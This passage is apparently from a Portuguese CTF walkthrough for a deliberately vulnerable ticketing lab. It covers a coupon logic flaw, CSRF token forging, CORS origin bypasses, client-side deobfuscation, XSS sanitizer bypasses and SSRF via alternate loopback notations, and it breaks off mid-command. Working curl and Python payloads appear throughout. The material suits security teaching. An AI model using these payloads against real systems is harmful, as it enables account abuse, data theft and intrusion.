cupons da tela `/comprar` (que é pública, não precisa de sessão). Entre as
campanhas ativas, o cupom-alvo é o único cuja descrição enuncia os dois números
em vez de um nome de campanha: *"Desconto de R$ X em compras a partir de R$ Y"*.
Confira que X e Y batem com a coluna "Cupom (mínimo)" da tabela acima. Os ids
dos adicionais são 1 a 4, na ordem da tela.

Pela interface: em `/comprar`, escolha um lote disponível, quantidade 1, marque
os adicionais indicados, digite o cupom e finalize. O recibo mostra o total
negativo e o bloco de conformidade.

Pela API (exemplo da variante A):

```bash
curl -s -b a.txt -X POST $ATR/api/pedidos \
  -H 'content-type: application/json' \
  -d '{"lote_id":2,"quantidade":1,"adicionais":[1,2],"cupom":"<CODIGO-DO-CUPOM>"}'
```

```json
{
  "pedido_id": 123,
  "subtotal": 25500,
  "desconto_lote_pct": 35,
  "apos_desconto_lote": 16575,
  "cupom": "...",
  "desconto_cupom": 17000,
  "cupom_minimo": 22600,
  "total": -425,
  "conformidade": {
    "flag": "OCEAN{15-...}",
    "fragmento_cofre": "..."
  },
  "aviso": "total apurado igual ou menor que zero; pedido registrado para conferência do financeiro"
}
```

A flag sai quando `total <= 0`, junto com o fragmento do cofre. Use um lote
disponível com estoque — o **Lote regular** — e não o *Última chamada*, que você
provavelmente já esgotou na flag 14.

**Se travou aqui.** `cupom_abaixo_do_minimo` significa que o seu subtotal ficou
**abaixo** da janela: falta adicional. Um total positivo significa que ficou
**acima**: sobra adicional, ou sobra quantidade. A resposta de erro devolve
`subtotal_atual` e `minimo`, então dá para calibrar em dois ou três tiros sem
varrer nada.

**Por que funciona.** Toda regra de negócio que compara um valor com um limite
tem que responder à pergunta "qual valor?" **uma vez só**. Aqui, duas partes do
mesmo fluxo responderam diferente — uma olha o antes, a outra o depois — e
ninguém conferiu se as duas respostas eram a mesma. O bug não está em nenhuma
das duas contas isoladamente: cada uma, sozinha, é defensável.

Cuidado com a formulação: dizer "o cupom foi aplicado depois do desconto de
lote" **não é falha nenhuma** — é exatamente o que a tela promete e o que a
política diz. A falha é a elegibilidade ser checada contra um número e o
abatimento sair de outro. Quem mostra a conta (a fórmula da janela, ou a
enumeração das 96 combinações) demonstrou entendimento; quem mostra só o recibo
negativo demonstrou execução.

---

## Flag 16 — a flag mora dentro do token CSRF

`CSRF e CORS` · 2 pontos · exige participante · **o formato varia por semente**

**A falha.** O token anti-CSRF usa um formato próprio com duas partes:
`base64url(json).hmac`. O JSON não está cifrado. Um dos campos, `ctx`,
carrega a flag 16 em texto claro. Quem trata token como string opaca passa
direto por cima dela.

**O convite.** O token acompanha **toda página autenticada**, em uma meta tag:

```html
<meta name="csrf-token" content="eyJ0cyI6MTc4NzM4OTg2Nyw...J9.a1b2c3...">
```

Está no código-fonte de qualquer tela logada — `/perfil`, `/carteira`,
`/minha-conta`. Há ainda um endpoint dedicado, que a aplicação usa para renovar
o token, com o mesmo conteúdo:

```bash
curl -s -b a.txt $ATR/api/csrf
# {"csrf_token":"<payload>.<assinatura>","expira_em":7200,
#  "usar_em":"cabeçalho X-Atr-Csrf ou campo csrf_token"}
```

**O percurso.** Pegue a primeira parte (tudo antes do ponto) e decodifique como
base64url:

```bash
TOKEN=$(curl -s -b a.txt $ATR/api/csrf | python3 -c \
  'import json,sys; print(json.load(sys.stdin)["csrf_token"])')

python3 - "$TOKEN" <<'EOF'
import base64, sys
p = sys.argv[1].split(".")[0]
print(base64.urlsafe_b64decode(p + "=" * (-len(p) % 4)).decode())
EOF
```

```json
{"ts":1787389867,"ctx":"OCEAN{16-............}","v":2,"uid":"U-84137099"}
```

O `ctx` é a flag. Pelo navegador dá para fazer o mesmo no console:

```javascript
JSON.parse(atob(document.querySelector('meta[name=csrf-token]').content.split('.')[0]
  .replace(/-/g,'+').replace(/_/g,'/')))
```

**O formato exato depende da sua instância.** O que a assinatura cobre é
sorteado por semente entre quatro opções, e uma delas muda o próprio payload.
Esta é a sua:

| Variante | Cobertura do HMAC |
|:--:|---|
| A | `so_ts` |
| B | `truncado` |
| C | `so_ts` |
| D | `ts_ctx` |
| E | `truncado` |
| F | `campo_errado` |
| G | `truncado` |
| H | `so_ts` |

E é isto que cada uma significa:

| Cobertura | O que entra no HMAC | Efeito visível no payload |
|---|---|---|
| `so_ts` | só o valor de `ts` | nenhum — payload com 4 campos |
| `ts_ctx` | `ts` e `ctx`, concatenados | nenhum — payload com 4 campos |
| `truncado` | os **24 primeiros caracteres** do payload em base64 | nenhum — payload com 4 campos |
| `campo_errado` | `sub` e `ts`, concatenados, enquanto a sessão é conferida contra `uid` | **um campo a mais**: `{"ts":…,"ctx":…,"v":2,"sub":"U-…","uid":"U-…"}` |

Se você é da variante F, o seu payload tem `sub` **e** `uid`, com o mesmo valor.
Nas outras sete, o `sub` não existe. Se o seu token não bate com a linha da sua
variante, o token não é da sua instância — é de um colega.

Repare também na **ordem dos campos**: `ts`, `ctx`, `v`, (`sub`), `uid`. O `uid`
é escrito por último de propósito, e isso importa muito na cobertura
`truncado` — 24 caracteres de base64 correspondem aos 18 primeiros bytes do
JSON, que é mais ou menos `{"ts":<10 dígitos>,"`. Ou seja: na `truncado`, o
material assinado nem chega ao `ctx`, quanto mais ao `uid`.

**Atenção ao formato.** Esse token não é um JWT: a aplicação espera um JSON
codificado em base64url seguido do HMAC, sem cabeçalho. O exemplo acima
decodifica a primeira parte localmente. Para alterar o token na próxima flag,
também será preciso preservar a parte que a assinatura cobre.

**Por que funciona.** Um token anti-CSRF precisa ser imprevisível para terceiros
e verificável pelo servidor. Nada disso exige que ele seja legível pelo cliente,
e nada disso o impede de carregar dados — foi por aí que a flag entrou. A lição
prática é anterior à flag: **todo token de duas ou três partes separadas por
ponto merece uma decodificação de base64 antes de você o tratar como opaco**. É
um gesto de dez segundos e ele aparece em aplicação real com frequência.

**A ponte para a flag 17.** O formato de duas partes anuncia que existe uma
assinatura. A pergunta que segue — e que vale os 5 pontos da flag 17 — é: *a
assinatura cobre o quê?* A tabela de coberturas acima já responde para a sua
instância; o exercício é descobri-la testando campo a campo, e a flag 17 é o
que acontece quando você troca o campo que a assinatura não protege.

---

> As linhas de comando desta seção usam `$ATR` e `$JAR`, definidos na abertura:
> `export ATR=http://127.0.0.1:8000` e `export JAR="$PWD/cookies.txt"`.

## Flag 17 — a assinatura do token CSRF não amarra o token à sessão

`csrf` · 5 pontos · exige conta de participante · varia por semente

A flag 16 pediu que você abrisse o token e lesse o que tem dentro. A 17 usa o
mesmo token e faz a pergunta seguinte, que é a pergunta interessante: **a
assinatura cobre o quê?**

São duas perguntas diferentes sobre o mesmo objeto. Ler o payload é observação.
Descobrir o que a assinatura protege é experimento — e o experimento tem método.

### O que está errado no código

O token tem duas partes, `base64url(json)` e um HMAC, separadas por ponto.
A rotina que assina o token monta o material a partir de
*alguns* campos do payload, e o `uid` nunca é um deles. A validação do token
faz três coisas nesta ordem:

1. confere a assinatura;
2. confere o `ts` contra a janela de validade;
3. compara `dados["uid"]` com o `uid` da sessão.

Quando a assinatura confere e o `uid` não bate, o servidor devolve
`409` com `{"erro":"token_nao_vinculado_a_sessao", "codigo_conformidade":"OCEAN{17-...}"}`
— e **não executa a ação**. Isso é deliberado e é parte da lição: a falha aqui é
a assinatura não proteger o vínculo declarado com a sessão. Não é uma execução
indevida.

O emissor escreve o `uid` como **último** campo do JSON de propósito. Guarde
isso, porque explica uma das quatro coberturas.

### As quatro coberturas, e a sua

O eixo é sorteado por semente. Cada imagem do `atrium-lab.tar.gz` tem uma:

| Variante | Cobertura do HMAC |
|:--:|---|
| A | `so_ts` |
| B | `truncado` |
| C | `so_ts` |
| D | `ts_ctx` |
| E | `truncado` |
| F | `campo_errado` |
| G | `truncado` |
| H | `so_ts` |

O que cada uma assina:

| Cobertura | Material assinado |
|---|---|
| `so_ts` | só o valor do campo `ts` |
| `ts_ctx` | `ts` e `ctx`, concatenados — nunca o `uid` |
| `truncado` | os 24 primeiros caracteres do payload **em base64** |
| `campo_errado` | `sub` e `ts`, concatenados, enquanto a sessão é conferida contra `uid` |

Em `truncado`, 24 caracteres de base64 são exatamente os 18 primeiros bytes do
JSON — `{"ts":<10 dígitos>,"`. Nada além disso está protegido. É por isso que o
`uid` é o último campo: ele cai muito depois do corte.

### O experimento: um campo por vez

Pegue um token, decodifique a primeira parte, troque **um** campo, reanexe a
assinatura original **intacta**, e mande. Repita para cada campo. A tabela
abaixo foi conferida rodando o código; ela é o resultado que você deveria ter
produzido sozinho:

| O que você troca | `so_ts` | `ts_ctx` | `truncado` | `campo_errado` |
|---|:--:|:--:|:--:|:--:|
| só o `uid` | passa (409, flag) | passa | passa | passa |
| o `ctx` | passa | **quebra** | passa | passa |
| o `ts` | quebra | quebra | quebra | quebra |
| o `sub` (só existe em uma) | — | — | — | **quebra** |
| um espaço depois de `"ts":`, mantendo o mesmo valor | passa | passa | **quebra** | passa |

Três leituras saem daí:

- **`ts_ctx` se identifica sozinho**: é o único em que trocar o `ctx` é
  recusado.
- **`campo_errado` se identifica pelo payload**: ele tem um campo a mais, e a
  ordem é `{"ts":…,"ctx":…,"v":2,"sub":"U-…","uid":"U-…"}`. Nos outros três o
  `sub` não existe. Atenção: se você trocar os dois de uma vez (um `replace` do
  valor do UID troca `sub` e `uid` juntos), a assinatura quebra e parece que o
  bypass não funciona. Troque **só o `uid`**, deixando o `sub` como estava.
- **`so_ts` e `truncado` se confundem** nos testes de valor: os dois aceitam
  troca de `uid` e de `ctx`, e os dois quebram com troca de `ts`. O que separa é
  a última linha da tabela: mude a *grafia* sem mudar o *valor*. Inserir um
  espaço depois de `"ts":` não muda `str(dados["ts"])`, então `so_ts` continua
  conferindo; mas muda os primeiros bytes do payload, e `truncado` quebra. Esse
  é o teste que prova que a assinatura cobre um prefixo de bytes, não um campo.

### Payload

Precisa de uma sessão de participante (`$JAR` é o arquivo de cookies do seu
login). Pegue o token de `GET /api/csrf` ou da `<meta name="csrf-token">` de
qualquer página autenticada.

```bash
TOKEN=$(curl -s -b "$JAR" "$ATR/api/csrf" \
        | python3 -c 'import sys,json; print(json.load(sys.stdin)["csrf_token"])')

FORJADO=$(python3 - "$TOKEN" <<'PY'
import base64, sys
tok = sys.argv[1]
p, sig = tok.split(".", 1)
bruto = base64.urlsafe_b64decode(p + "=" * (-len(p) % 4)).decode()
print("payload original:", bruto, file=sys.stderr)
i = bruto.rfind('"uid":"') + 7          # SÓ o uid; o sub, se existir, fica
j = bruto.index('"', i)
novo = bruto[:i] + "U-00000000" + bruto[j:]
print(base64.urlsafe_b64encode(novo.encode()).decode().rstrip("=") + "." + sig)
PY
)

curl -s -b "$JAR" -X POST "$ATR/api/conta/preferencias" \
  -H 'content-type: application/json' \
  -d "{\"csrf_token\":\"$FORJADO\",\"notif_email\":true}"
```

Para o teste que separa `so_ts` de `truncado`, troque a linha do `novo` por:

```python
novo = (bruto[:i] + "U-00000000" + bruto[j:]).replace('"ts":', '"ts": ', 1)
```

### Preserve a serialização

Na cobertura `truncado`, a assinatura protege um prefixo do texto em base64.
Formatar o JSON com espaços ou mudar a ordem das chaves pode alterar esse
prefixo, mesmo que os valores assinados continuem iguais.

Para isolar o teste, mantenha o texto original e altere apenas o `uid`.
É por isso que o exemplo mexe na *string*, em vez de reconstruir o dicionário,
e mantém o base64url sem preenchimento.

### A lição

Uma assinatura não é um selo de "este objeto é confiável". Ela é uma afirmação
sobre um conjunto específico de bytes, e todo campo fora desse conjunto continua
sendo entrada do cliente. Um token que diz quem você é, mas cuja assinatura não
cobre esse "quem", não vincula nada.

---

## Flag 18 — o preflight publica a lista de origens confiáveis

`cors` · 2 pontos · sem sessão

### O que está errado no código

O `OPTIONS /api/widget/contexto` devolve um cabeçalho de diagnóstico,
`X-Atr-Trusted-Origins`, com as quatro origens que a aplicação considera
confiáveis. Uma delas **é** a flag, escrita como hostname:

```
https://ocean-18-<12 hex>.partners.eventosatrium.com
```

Chave e chave-fecha não são caracteres válidos em hostname, então o emissor
troca `{` por `-` e remove `}`. Você remonta o formato de volta:
`ocean-18-<hex>` → `OCEAN{18-<hex>}`. O formato da flag permite reconhecer e reverter essa transformação.

### Como se chega lá

Pela página `/integracoes/widget`, linkada no rodapé, na central de ajuda e na
página de planos. Ela documenta o trecho de incorporação e roda uma demonstração
ao vivo do widget, que carrega `/widget/inscricao.js` e consulta
`/api/widget/contexto` **com credenciais**. Isso indica qual endpoint investigar. Um GET simples
não exige preflight; envie o OPTIONS do exemplo abaixo para consultar os
cabeçalhos de diagnóstico.

### Payload

```bash
curl -s -X OPTIONS -D- -o /dev/null "$ATR/api/widget/contexto" \
  -H 'Origin: https://app.eventosatrium.com' \
  -H 'Access-Control-Request-Method: GET'
```

O cabeçalho sai com ou sem `Origin` válido — ele é diagnóstico, não parte da
negociação.

### Um cabeçalho que não quer dizer o que parece

A resposta também traz `X-Atr-Cors-Policy: origin-match/v3`. Ele é **neutro de
propósito**. Já foi `suffix-match/v3`, e isso mandava metade da turma para o
lado errado, porque o mecanismo real de conferência é sorteado por semente entre
quatro — e em dois deles um payload de sufixo não passa. Não leia esse cabeçalho
como dica do mecanismo. Ele só afirma que existe uma política de origem, que é o
convite para a flag 19.

### A lição

O achado de 2 pontos é o vazamento. O achado de verdade é o insumo: sabendo o
*formato* das origens que a aplicação aceita, você tem material para construir
uma origem que se pareça com elas. Quem entregou a 18 e não emendou na 19 leu um
cabeçalho; quem emendou entendeu para que serve a informação.

---

## Flag 19 — validação de origem contornável

`cors` · 5 pontos · sem sessão · varia por semente

### O que está errado no código

A rotina que valida a origem decide se ela é confiável **casando
trecho de texto**, em vez de comparar domínio. O erro exato é sorteado por
semente entre quatro. Quando a origem é aceita mas não é um domínio legítimo, a
resposta traz:

- `Access-Control-Allow-Origin` refletindo a origem que você mandou;
- `Access-Control-Allow-Credentials: true`;
- os dados de cadastro e os ingressos do portador da sessão;
- a flag em `diagnostico_integracao`;
- uma nota que nomeia o defeito — *"origem aceita por casamento parcial de texto,
  não por igualdade de domínio"* — sem dizer qual dos quatro é o desta imagem.

### O que está em jogo

`/api/widget/contexto` com credenciais devolve nome, e-mail, telefone, UID e a
lista de ingressos com valor pago. O widget vai com credenciais porque, no site
do parceiro, ele mostra "Olá, Ana — você já tem ingresso" em vez do formulário em
branco. É esse dado que transforma a falha de exercício em problema.

### As quatro validações, e a sua

| Variante | Validação |
|:--:|---|
| A | `regex` |
| B | `substring` |
| C | `substring` |
| D | `endswith` |
| E | `regex` |
| F | `regex` |
| G | `contains` |
| H | `regex` |

| Eixo | Regra no código | Bypass canônico | Por que fura |
|---|---|---|---|
| `endswith` | `origin.endswith("eventosatrium.com")` | `https://evil-eventosatrium.com` | o domínio é sufixo de qualquer nome que termine nele — inclusive sem o ponto separador |
| `contains` | `"eventosatrium.com" in origin` | `https://eventosatrium.com.evil.test` | o domínio pode estar em qualquer posição da string |
| `regex` | `re.match(r"https://([a-z0-9-]+\.)*eventosatrium\.com", origin)` | `https://a.eventosatrium.com.evil.test` | `re.match` ancora só no início; falta o `$` no fim |
| `substring` | alguma origem confiável é substring da recebida | `https://app.eventosatrium.com.evil.test` | qualquer confiável com sufixo colado |

Matriz conferida contra a aplicação, com o domínio real (✔ = aceita):

| Origem testada | `endswith` | `contains` | `regex` | `substring` | é legítima? |
|---|:--:|:--:|:--:|:--:|:--:|
| `https://evil-eventosatrium.com` | ✔ | ✔ | | | não |
| `https://eventosatrium.com.evil.test` | | ✔ | ✔ | | não |
| `https://a.eventosatrium.com.evil.test` | | ✔ | ✔ | | não |
| `https://app.eventosatrium.com.evil.test` | | ✔ | ✔ | ✔ | não |
| `https://eventosatrium.com.br` | | ✔ | ✔ | | não |
| `https://parceiros.eventosatrium.com` | ✔ | ✔ | ✔ | ✔ | **sim** |
| `http://evil.test` | | | | | não |

Duas origens cobrem os quatro eixos entre si: `https://evil-eventosatrium.com` e
`https://app.eventosatrium.com.evil.test`. Se você só queria a flag, uma das
duas resolvia. Se você queria saber qual é o mecanismo da sua imagem, precisava
das cinco linhas.

### Payload

```bash
for O in https://evil-eventosatrium.com \
         https://eventosatrium.com.evil.test \
         https://a.eventosatrium.com.evil.test \
         https://app.eventosatrium.com.evil.test \
         https://parceiros.eventosatrium.com; do
  echo "== $O"
  curl -s -b "$JAR" "$ATR/api/widget/contexto" -H "Origin: $O" \
    | python3 -m json.tool | grep -E '"cors"|diagnostico_integracao|"nota"'
done
```

O cookie não é necessário para a flag; ele é necessário para ver o impacto (os
campos `participante` e `meus_ingressos`). Rode as duas vezes — a diferença
entre as respostas é o seu argumento de severidade.

### O quase-acerto, e como a aplicação te avisa

`https://parceiros.eventosatrium.com` é uma origem **legítima segundo a
política do laboratório**: recebe `Access-Control-Allow-Origin`, credenciais e
todos os dados — e não dá flag. A resposta diz `"cors": "origem homologada"`.
Quem viu os dados aparecerem e concluiu "explorei" não explorou nada, e o campo
estava lá dizendo isso.

Quando a origem é recusada, a resposta ainda é **200**, com
`"cors": "origem não reconhecida"`. Confira esse campo e os cabeçalhos CORS;
o código HTTP sozinho não informa se a origem foi aceita.

### A lição

`Origin` é uma string, e o navegador a constrói a partir de esquema, host e
porta. Validar por trecho de texto é comparar a coisa errada. A validação certa
faz o parse da URL, extrai o hostname e compara por igualdade — ou por igualdade
do sufixo **com o ponto**, se subdomínios forem permitidos.

Sobre o impacto, seja preciso: uma origem indevidamente aceita **pode** ler dados
autenticados quando o navegador envia o cookie da sessão e as demais condições de
CORS e de cookie permitem a requisição. `Access-Control-Allow-Credentials: true`
é parte dessa condição, não a condição inteira. A flag, por desenho, sai sem
vítima nenhuma.

---

## Flag 20 — a flag é remontada no navegador

`analise-cliente` · 3 pontos · exige organizador

### O que investigar

A classe desta flag é `analise-cliente`. O percurso consiste em ler o HTML
e o JavaScript do painel para reconstruir um valor que já foi enviado ao
navegador. A exploração de XSS aparece na flag 21.

### O que está errado no código

`GET /painel/selo` faz o seguinte, no servidor:

```python
partes = ["", "", ""]
for idx, ch in enumerate(valor):
    partes[idx % 3] += ch
dados = [base64.b64encode(p.encode()).decode() for p in partes]
```

Ou seja: o caractere de posição `i` do valor vai para o bloco `i % 3`, cada bloco
é codificado em base64, e os três saem no HTML como `data-b0`, `data-b1` e
`data-b2` do elemento `[data-selo]`.

O HTML não contém o valor completo em texto claro; ele contém os três blocos
necessários para reconstruí-lo. A remontagem existe só no
cliente, na função `Atrium.montarSelo()` do `/static/app.js` — e **nada na página
a chama**. O campo do selo fica exibindo `—`.

### O convite

Uma tela de conformidade que mostra um traço onde deveria haver um
identificador, com o texto: *"O selo é montado no navegador a partir dos blocos
de verificação entregues com a página. O valor completo não trafega."* Os
atributos `data-*` estão no código-fonte da página, à vista.

### Payload

Com o painel aberto como organizador, no console do navegador:

```js
Atrium.montarSelo()      // "OCEAN{20-...}"
```

Ou reimplemente, o que é o que separa quem leu de quem rodou. Copie os três
atributos do HTML e:

```python
import base64
b = [base64.b64decode(x).decode() for x in (B0, B1, B2)]
total = sum(len(x) for x in b)
print("".join(b[i % 3][i // 3] for i in range(total)))
```

A função também está comentada no sourcemap da flag 3 (`/static/app.js.map`), se
você chegou nela por lá.

Para registrar a conferência (e disparar o evento no log):

```bash
curl -s -b "$JAR" -X POST "$ATR/api/painel/selo/registrar" \
  -H 'content-type: application/json' -d '{"selo":"OCEAN{20-...}"}'
```

### A lição

**Ofuscação no cliente não é controle.** Tudo que o navegador consegue remontar,
quem controla o navegador consegue remontar — e quem lê o bundle consegue
remontar sem o navegador. Partir o valor em três, codificar em base64 e não
chamar a função não protege nada: protegeria contra uma busca por texto, e só.

O algoritmo pode ser resumido assim: *os três blocos são as posições do valor
módulo 3, em base64*. O valor nunca trafega inteiro em texto claro; é preciso
entender a remontagem para recuperá-lo. É isso que torna a tela um exercício de
análise de cliente e não um vazamento comum.

---

## Flag 21 — bypass do sanitizador de crachá

`xss` · 7 pontos · exige organizador · varia por semente

Esta flag exercita as cinco lacunas do sanitizador, escolhidas por semente. Cada imagem tem **uma** lacuna, entre cinco.

### A arquitetura, que é o que faz a flag funcionar

Em `POST /api/crachas/previsualizar`, a descrição do crachá passa por dois
componentes, nesta ordem:

1. **O sanitizador** — um filtro artesanal feito com expressões regulares.
   É ele que tem a lacuna.
2. **O verificador** — um parser de HTML de verdade, que roda
   **sobre a saída já sanitizada** e procura três coisas na árvore resultante:
   elemento `<script>`, atributo de evento com valor não vazio, e URL com
   esquema executável em `href`/`src`/`action`/`formaction`/`data`/`xlink:href`.

Se sobrou construção executável, a resposta é **409** com
`"status":"alerta_de_conteudo"` e o `alerta_id` — que é a flag.

Dois detalhes de desenho explicam por que isso é um exercício e não um sorteio:

- O verificador roda depois do filtro. Se rodasse sobre a entrada bruta, a flag
  sairia sem você ter derrotado filtro nenhum.
- O verificador **não compartilha código nem regex** com o sanitizador. Se
  compartilhasse, teria a mesma lacuna e nunca dispararia.

### O oráculo: o campo `removidos`

Quando o conteúdo é limpo, a resposta é:

```json
{"status":"conteudo_sanitizado","removidos":["onerror="],"previsualizacao":"<img src=x >"}
```

Esse `removidos` é **honesto em todas as sementes**: lista o que aquele
sanitizador de fato removeu. Ele é o convite, e ele não pode mentir — é o
instrumento com que você descobre o que o filtro enxerga. O método correto é:

1. mande uma tentativa ingênua (`<img src=x onerror=alert(1)>`);
2. leia `removidos` e `previsualizacao`;
3. pergunte *por que* ele viu o que viu, e construa a entrada que ele não vê.

### As cinco lacunas, e a sua

| Variante | Lacuna |
|:--:|---|
| A | `barra` |
| B | `quebra` |
| C | `nao_recursivo` |
| D | `barra` |
| E | `entidade` |
| F | `quebra` |
| G | `quebra` |
| H | `barra` |

A lacuna `case` existe no código e não caiu em nenhuma das oito imagens
empacotadas. Ela está descrita abaixo porque o mecanismo vale a leitura.

| Lacuna | O erro do sanitizador | Payload que sobrevive | O que o verificador acusa | `removidos` |
|---|---|---|---|---|
| `barra` | não reconhece a barra como fim do token anterior, então não vê o handler | `<svg/onload=alert(1)>` | atributo de evento `onload` | `[]` |
| `quebra` | não reconhece quebra de linha nem tab como separador | `<img src=x` + quebra de linha literal + `onerror=alert(1)>` | atributo de evento `onerror` | `[]` |
| `nao_recursivo` | remove `<script>` numa passada só, sem repetir até estabilizar | `<scr<script>ipt>alert(1)</scr</script>ipt>` | elemento `<script>` | `["<script>"]` |
| `case` | compara o nome do handler sem ignorar caixa | `<sVg oNLoAd=alert(1)>` | atributo de evento `onload` | `[]` |
| `entidade` | procura o esquema executável literalmente, sem decodificar entidades | `<a href="java&#115;cript:alert(1)">x</a>` | esquema executável em `href` | `[]` |

A matriz foi conferida contra a aplicação, com os cinco
payloads contra as cinco lacunas: a diagonal fecha exatamente, e **nenhum payload
abre uma lacuna que não é a dele**. Se você testou o payload de um colega de
outra variante e não funcionou, não era erro seu.

`nao_recursivo` tem uma assinatura própria e vale reparar nela: o `removidos`
traz `<script>` — a primeira passada de fato removeu um par — e mesmo assim
sobra um `<script>` inteiro na saída. Ver "removi script" ao lado de um script
intacto na pré-visualização é o sinal.

### Payload

```bash
# variante A / D / H  (lacuna: barra)
curl -s -b "$JAR" -X POST "$ATR/api/crachas/previsualizar" \
  -H 'content-type: application/json' \
  -d '{"descricao":"<svg/onload=alert(1)>"}'

# variante B / F / G  (lacuna: quebra) — o \n do JSON vira quebra literal
curl -s -b "$JAR" -X POST "$ATR/api/crachas/previsualizar" \
  -H 'content-type: application/json' \
  -d '{"descricao":"<img src=x\nonerror=alert(1)>"}'

# variante C  (lacuna: nao_recursivo)
curl -s -b "$JAR" -X POST "$ATR/api/crachas/previsualizar" \
  -H 'content-type: application/json' \
  -d '{"descricao":"<scr<script>ipt>alert(1)</scr</script>ipt>"}'

# variante E  (lacuna: entidade)
curl -s -b "$JAR" -X POST "$ATR/api/crachas/previsualizar" \
  -H 'content-type: application/json' \
  -d '{"descricao":"<a href=\"java&#115;cript:alert(1)\">x</a>"}'

# lacuna case (em nenhuma das oito imagens)
#  -d '{"descricao":"<sVg oNLoAd=alert(1)>"}'
```

### O princípio: remover é transformar

Esta é a parte que vale mais do que a flag.

Um sanitizador por remoção não "apaga" o perigoso. Ele **transforma** a string —
e toda transformação pode produzir, na saída, algo que não existia na entrada.
Se nada relê o resultado, o que foi criado pela própria limpeza passa.

Uma remoção pode juntar trechos antes separados: por exemplo, retirar um
`<script>` de dentro de outro nome de tag pode formar um novo `<script>`.
Por isso, a saída também precisa ser analisada. Na lacuna `nao_recursivo`,
o filtro faz uma única passada e deixa essa recomposição acontecer.

Expressões regulares também podem interpretar separadores e entidades de modo
diferente do parser HTML. `onerror&#61;`, por exemplo, não cria um atributo de
evento válido só porque `&#61;` representa um sinal de igual: entidades não são
interpretadas dessa forma no nome do atributo. Diferencie uma construção que
executa no navegador de um falso positivo do detector.

Na lacuna `barra`, o filtro trata o espaço em branco como único separador antes
do nome do handler, mas a barra depois do nome da tag também separa atributos,
e ele não reconhece esse caso. A correção geral é fazer o parse do HTML,
construir uma árvore, aplicar uma allowlist de elementos e atributos e
serializar de volta, em vez de sanitizar com expressão regular.

---

## Flag 22 — SSRF em dois estágios

`ssrf` · 9 pontos · exige operador da plataforma · carrega fragmento do cofre ·
varia por variante

A flag mais cara individualmente, e a que mais depende de tudo o que veio antes.

### Primeiro: chegar lá

A conta de operador da plataforma não sai de escalada. Ela sai da flag 12 (SQL
injection), que entrega `operador.usuario` e `operador.senha_provisoria` na
tabela `platform_secrets`. Duas travas te esperam no login:

**1. O downgrade de MFA da flag 7 não funciona aqui.** A conta de operador passa
por uma regra própria: para ela o servidor **ignora** a lista `factors` que o
cliente manda e exige o segundo fator de qualquer jeito. A recusa confirma a
diferença: a falha da 7 é a *origem da decisão* estar no cliente, não o endpoint.

**2. O segredo do TOTP não está no banco.** No lugar dele, a `platform_secrets`
traz um ponteiro: `operador.mfa_provisionamento = <nao-armazenado>`, dizendo que o
provisionamento é mantido pelo serviço de configuração da plataforma. Esse
serviço é o `platformSettings` do GraphQL, alcançável pelos caminhos da flag 11:

```bash
curl -s -X POST "$ATR/graphql" -H 'content-type: application/json' \
  -d '{"query":"query Fila { platformSettings { mfaProvisionamento conectorInterno } }","operationName":"Fila"}'
# otpauth://totp/…?secret=…&digits=8&period=45
```

Repare nos parâmetros: **8 dígitos, janela de 45 segundos**, publicados na
própria URI. Gerar o código com os valores padrão (6 dígitos, 30 segundos)
devolve `totp_invalido`. É preciso ler o provisionamento de verdade, não só
copiar o `secret=`.

### O formulário, por variante

O console do operador tem um formulário de diagnóstico que recebe uma URL de
parceiro e a consulta. O formulário fica no console do operador; seu rótulo e o nome do campo variam:

| Variante | Formulário | Campo no JSON |
|:--:|---|---|
| A, H | validação de webhook de confirmação | `url_webhook` |
| B, E | teste de conector de integração | `endpoint` |
| C, F | busca de logo do crachá por URL | `url_logo` |
| D, G | importação de lista por URL | `url_lista` |

O endpoint é `POST /api/operador/diagnostico`.

### O que está errado no código

Há **duas camadas**, e só a primeira varia.

**Camada 1 — o filtro textual.** Ingênua de propósito. Ela extrai o host "na
marra": corta no `://`, corta no primeiro `/`, corta no `?` e no `#`. Depois
compara o resultado contra literais (`127.0.0.1`, `localhost`, `0.0.0.0`,
`::1`, `169.254.169.254`, `metadata`…) e contra prefixos privados (`10.`,
`192.168.`, `172.16.` a `172.31.`…). Notações alternativas de loopback passam.
Nas variantes vulneráveis a `userinfo`, ela comete o erro clássico de tratar o
que vem **antes do `@`** como se fosse o host.

**Camada 2 — a resolução real.** Resolve o hostname de verdade e só
prossegue se **todos** os endereços resolvidos forem loopback; o pedido é então
reemitido contra o IP validado, com o `Host` original no cabeçalho. Esta camada
**não varia em nenhuma instância** e é o que impede o SSRF alcançar metadados de
nuvem, rede privada, rede do Docker e internet aberta — em qualquer notação,
inclusive nas que a camada 1 deixa passar de propósito.

A segunda camada restringe os destinos desse SSRF ao loopback do contêiner.
Ela mantém a falha textual disponível para o exercício, com esse limite de alcance. Um filtro que decide sobre
texto e depois conecta em outra coisa é a definição do problema.

### As notações, e a regra de interseção zero

Cinco notações escrevem o mesmo endereço de loopback:

| Notação | Como escrever |
|---|---|
| `dotted` | `127.1` |
| `decimal` | `2130706433` |
| `hex` | `0x7f000001` (ou `0x7f.0.0.1`) |
| `octal` | `0177.0.0.1` |
| `userinfo` | `parceiro.eventosatrium.com@127.0.0.1` |

E há **dois filtros** na cadeia: o do diagnóstico da aplicação e o do relay do
conector interno. Entre as cinco notações da tabela, o relay aceita o complemento das opções
aceitas pelo diagnóstico, sem interseção. O payload
que abriu a primeira porta não abre a segunda. Isso é desenho, não bug: o segundo
estágio exige que você encontre uma segunda forma de escrever o mesmo endereço.

| Variante | O diagnóstico aceita | O relay aceita |
|:--:|---|---|
| A | `dotted`, `decimal`, `userinfo` | `hex`, `octal` |
| B | `decimal`, `hex`, `octal` | `dotted`, `userinfo` |
| C | `dotted`, `hex`, `userinfo` | `decimal`, `octal` |
| D | `decimal`, `octal`, `userinfo` | `dotted`, `hex` |
| E | `dotted`, `hex`, `octal` | `decimal`, `userinfo` |
| F | `dotted`, `decimal`, `hex` | `octal`, `userinfo` |
| G | `hex`, `octal`, `userinfo` | `dotted`, `decimal` |
| H | `dotted`, `decimal`, `octal` | `hex`, `userinfo` |

Conferido contra a aplicação, com as notações de cada variante.

### O percurso

A forma óbvia é bloqueada:

```bash
curl -s -b "$JAR" -X POST "$ATR/api/operador/diagnostico" \
  -H 'content-type: application/json' \
  -d '{"url_webhook":"http://127.0.0.1:8088/"}'
# {"erro":"destino_recusado","mensagem":"destino bloqueado"}
```

**Estágio 1 — o conector (`:8088`).** Use uma notação que a *sua* variante
aceita no diagnóstico (exemplo da variante A, `dotted`):

```bash
curl -s -b "$JAR" -X POST "$ATR/api/operador/diagnostico" \
  -H 'content-type: application/json' \
